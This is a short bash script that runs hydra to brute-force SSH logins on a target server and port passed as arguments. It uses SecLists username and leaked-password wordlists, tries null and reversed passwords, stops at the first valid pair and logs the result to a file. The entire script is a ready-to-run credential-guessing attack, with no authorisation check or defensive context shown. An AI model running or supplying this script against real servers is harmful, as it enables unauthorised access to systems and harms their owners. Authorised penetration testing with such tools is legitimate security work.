#!/bin/bash

if [ $# -eq 2 ]; then
    hydra -v -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/darkweb2017-top100.txt -s $2 -e nsr -f -o "ssh_$1_$2_hydra.txt" ssh://$1

else
    echo "Please provide the target SSH server and its port."
fi
